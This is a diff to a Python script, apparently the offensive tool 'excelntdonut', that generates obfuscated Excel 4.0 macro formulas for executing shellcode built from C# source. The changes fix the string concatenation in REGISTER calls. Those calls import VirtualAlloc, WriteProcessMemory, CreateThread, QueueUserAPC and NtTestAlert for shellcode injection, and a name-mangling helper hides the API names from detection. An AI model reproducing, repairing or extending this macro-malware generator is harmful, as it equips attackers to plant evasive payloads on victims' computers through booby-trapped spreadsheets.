@@ -10,7 +10,7 @@ import struct
 
 '''
 Usage: 
-	python3 drive.py -f source.cs --obfuscate --sandbox
+	python3 excelntdonut.py -f source.cs --obfuscate --sandbox
 
 Options:
 	-f source.cs           C# source code (your payload must execute within the main() function)
@@ -113,8 +113,8 @@ def main():
 
 	#Print instructions
 	finalize()
-	
-#Stolen from https://github.com/trustedsec/unicorn/blob/master/unicorn.py also from my push to PS Empire Dev branch
+
+#Stolen from https://github.com/trustedsec/unicorn/blob/master/unicorn.py also from ceramicskate0 pull to PS Empire Dev branch
 # generate a random number based on range
 def generate_random_number(low, high):
     for x in range(1): return random.randint(low,high)
@@ -126,12 +126,12 @@ def mangle_word(word):
     assemble = ""
     for letter in word:
         if counter == random_length:
-            assemble = assemble + '"+"' + letter + '"+"' 
+            assemble = assemble + '"+"' + letter + '"+"'
         else:
             assemble = assemble + letter
-        counter = counter + 1 
+        counter = counter + 1
     return assemble
-	
+
 def chunks(s, n):
 	"""
 	Author: HarmJ0y, borrowed from Empire
@@ -431,9 +431,9 @@ def generateObfuscatedInstructions(args,x86Size, x64Size, offset, x86Count, x64C
 
 		
 	#R1C1 Style (required for obfuscated =FORMULA() function)
-	columnAList.append('=REGISTER('mangle_word("Kernel32")','mangle_word("VirtualAlloc")',"JJJJJ","Valloc",,1,9)\r\n')
-	columnAList.append('=REGISTER('mangle_word("Kernel32")','mangle_word("WriteProcessMemory")',"JJJCJJ","WProcessMemory",,1,9)\r\n')
-	columnAList.append('=REGISTER('mangle_word("Kernel32")','mangle_word("CreateThread")',"JJJJJJJ","CThread",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("VirtualAlloc")+',"JJJJJ","Valloc",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("WriteProcessMemory")+',"JJJCJJ","WProcessMemory",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("CreateThread")+',"JJJJJJJ","CThread",,1,9)\r\n')
 	columnAList.append('=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R10C' + cols['actionColR1'] + '),GOTO(R21C' + cols['actionColR1'] + '))\r\n')
 	
 	#32-bit valloc + shellcode selection
@@ -456,9 +456,9 @@ def generateObfuscatedInstructions(args,x86Size, x64Size, offset, x86Count, x64C
 	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ',Valloc(R21C' + cols['actionColR1'] + ',' + str(x64Size) + ',12288,64))\r\n')
 	columnAList.append('=SET.VALUE(R21C' + cols['actionColR1'] + ',R21C' + cols['actionColR1'] + '+262144)\r\n')
 	columnAList.append('=NEXT()\r\n')
-	columnAList.append('=REGISTER('mangle_word("Kernel32")','mangle_word("RtlCopyMemory")',"JJCJ","RTL",,1,9)\r\n')
-	columnAList.append('=REGISTER('mangle_word("Kernel32")','mangle_word("QueueUserAPC")',"JJJJ","Queue",,1,9)\r\n')
-	columnAList.append('=REGISTER('mangle_word("ntdll")','mangle_word("NtTestAlert")',"J","Go",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("RtlCopyMemory")+',"JJCJ","RTL",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("Kernel32")+','+mangle_word("QueueUserAPC")+',"JJJJ","Queue",,1,9)\r\n')
+	columnAList.append('=REGISTER('+mangle_word("ntdll")+','+mangle_word("NtTestAlert")+',"J","Go",,1,9)\r\n')
 	columnAList.append('main=R1C' + cols['x64ColR1'] + '\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',0)\r\n')
 	columnAList.append('=WHILE(main<>"EXCEL")\r\n')
